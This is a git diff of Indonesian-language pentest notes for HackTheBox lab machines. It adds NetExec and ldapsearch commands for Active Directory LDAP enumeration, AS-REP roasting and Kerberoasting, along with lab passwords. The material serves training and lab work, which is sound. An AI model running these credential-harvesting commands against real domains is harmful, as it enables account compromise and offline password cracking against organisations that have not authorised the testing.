@@ -6,6 +6,14 @@ adalah "phonebook" dari Active Directory. Semua object di domain — user, group
 | 389  | LDAP     |
 | 636  | LDAPS    |
 
+Level 0 -> Windows 2000
+Level 2 -> Windows Server 2003
+Level 3 -> Windows Server 2008
+Level 4 -> Windows Server 2008 R2
+Level 5 -> Windows Server 2012
+Level 6 -> Windows Server 2012 R2
+Level 7 -> Windows Server 2016
+Level 10 -> Windows Server 2019/2022
 # Null Session
 test credential
 ```shell
@@ -17,6 +25,31 @@ Login
 ldapsearch -H ldap://overwatch.htb -x -b 'DC=overwatch,DC=htb'
 ```
 
+# Authenticated Session
+```shell
+# outputnya banyak  
+ldapsearch -H ldap://logging.htb -x -b 'DC=logging,DC=htb' -D 'wallace.everette@logging.htb' -w 'Welcome2026@' | tee ldapsearch.txt
+```
+
+# AS-REP Roasting 
+```shell
+nxc ldap 10.129.245.130 -u 'wallace.everette' -p 'Welcome2026@' --asreproast asreproastable.txt
+```
+
+# List User
+```shell
+nxc ldap <IP> -u '<user>' -p '<pass>' -M get-desc-users
+```
+# List Computer
+```shell
+nxc ldap 10.129.8.96 -u pentest -p 'p3nt3st2025!&' --computers
+```
+![](Attachments/Pasted%20image%2020260621170242.png)
+
+# Password Policy
+```shell
+nxc ldap <IP> -u user -p pass --pass-pol
+```
 # Kerberoasting
 ```shell
 nxc ldap 10.129.4.104 -u 'pentest' -p 'p3nt3st2025!&' --kerberoasting kerberoasting.txt
